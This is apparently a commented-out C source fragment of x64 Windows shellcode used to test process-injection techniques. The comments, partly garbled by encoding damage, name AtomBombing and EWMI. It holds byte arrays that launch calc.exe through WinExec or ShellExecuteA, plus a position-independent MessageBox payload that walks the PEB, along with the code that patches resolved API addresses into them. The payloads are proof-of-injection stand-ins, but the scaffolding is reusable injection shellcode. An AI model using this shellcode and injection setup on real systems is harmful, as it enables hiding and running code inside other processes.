
/*
// ���������calc��shellcode��������00 00 ���µ�shellcode�жϣ��״�ʹ����atombombing
unsigned char shellcode[] = {
    // ����"calc.exe"�ַ�����ջ��
    0x48, 0x31, 0xC0,               // xor rax, rax
    0x50,                           // push rax        ; null terminator
    0x68, 0x2E, 0x65, 0x78, 0x65,   // push "exe."
    0x68, 0x63, 0x61, 0x6C, 0x63,   // push "calc"

    // ���ò���������
    0x48, 0x89, 0xE1,               // mov rcx, rsp    ; ��һ������
    0x6A, 0x01,                     // push 1          ; SW_SHOWNORMAL
    0x5A,                           // pop rdx         ; �ڶ�������

    // ����WinExec
    0x48, 0xB8,                     // mov rax,
    0xEF, 0xBE, 0xAD, 0xDE,        // WinExec��ַ
    0xEF, 0xBE, 0xAD, 0xDE,        // (��Ҫ���)
    0x48, 0xF7, 0xD0,               // not rax
    0xFF, 0xD0                      // call rax
};

    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    UINT64 WinExecAddr = (UINT64)GetProcAddress(hKernel32, "WinExec");

    // ���WinExec��ַ
    *(UINT64*)(shellcode + 22) = ~WinExecAddr;
*/

/*
	// ����汾��winexec
	UCHAR shellcode[] = {
		// mov rcx, 0x6863616C63
		0x48 , 0xB9 ,
		0x63 , 0x6C , 0x61 , 0x63 , 0x68 , 0x00 , 0x00, 0x00,

		// ����WinExec
		0x48, 0xB8,                     // mov rax,
		0xEF, 0xBE, 0xAD, 0xDE,        // WinExec��ַ
		0xEF, 0xBE, 0xAD, 0xDE,        // (��Ҫ���)
		0x48, 0xF7, 0xD0,               // not rax
		0xFF, 0xD0,                      // call rax
	};

	HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
	UINT64 WinExecAddr = (UINT64)GetProcAddress(hKernel32, "WinExec");
	*(UINT64*)(shellcode + 12) = ~WinExecAddr;

*/

/*
// ���shellcode�����shellexecute�е�ջ�쳣
unsigned char shellcode_shellexecute[] = {
	// ջ����
	0x48, 0x83, 0xEC, 0x50,         // sub rsp, 80

	0x48, 0x31, 0xC0,               // xor rax, rax  
	0x50,                           // push rax (null terminator)

	// ���� "calc.exe" �ַ��� (С����)
	0x48, 0xB8,
	0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, // mov rax, "calc.exe" (С����)
	0x50,                           // push rax


	// ���üĴ�������
	0x48, 0x31, 0xC9,               // xor rcx, rcx        ; hwnd = NULL
	0x48, 0x31, 0xD2,               // xor rdx, rdx        ; lpOperation = NULL
	0x48, 0x89, 0xE0,               // mov rax, rsp        ; �ȱ����ַ�����ַ
	0x48, 0x83, 0xC0, 0x00,         // add rax, 8          ; ����null terminator
	0x49, 0x89, 0xC0,               // mov r8, rax         ; lpFile = "calc.exe"
	0x49, 0x31, 0xC9,               // xor r9, r9          ; lpParameters = NULL

	// ����ջ���� - ʹ����ȷ��ƫ��
0x48, 0x31, 0xC0,               // xor rax, rax
0x48, 0x89, 0x44, 0x24, 0x20,   // mov [rsp+0x20], rax  ; (��5������)
0x48, 0xC7, 0x44, 0x24, 0x28, 0x01, 0x00, 0x00, 0x00, // mov [rsp+0x28], 1  ; nShowCmd (��6������)



// ���� ShellExecuteA
0x48, 0xB8,                     // mov rax,
0xEF, 0xBE, 0xAD, 0xDE,        // ShellExecuteA��ַ
0xEF, 0xBE, 0xAD, 0xDE,
0xFF, 0xD0,                     // call rax

// ����ջ
0x48, 0x83, 0xC4, 0x60,         // add rsp, 96
0xC3                            // ret
};

FARPROC ShellExecuteAaddr = GetProcAddress(LoadLibraryA("shell32.dll"), "ShellExecuteA");
*(UINT64*)(shellcode_shellexecute + 57) = (UINT64)ShellExecuteAaddr;  // ƫ��32���ǵ�ַռλ��

*/

/*
// �״�ʹ����ewmi����Ϊ�޷����ⴴ�����̣�����ֻ��ԭ�ص���֤��ע��ɹ�
UCHAR shellcode_msgbox[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
*/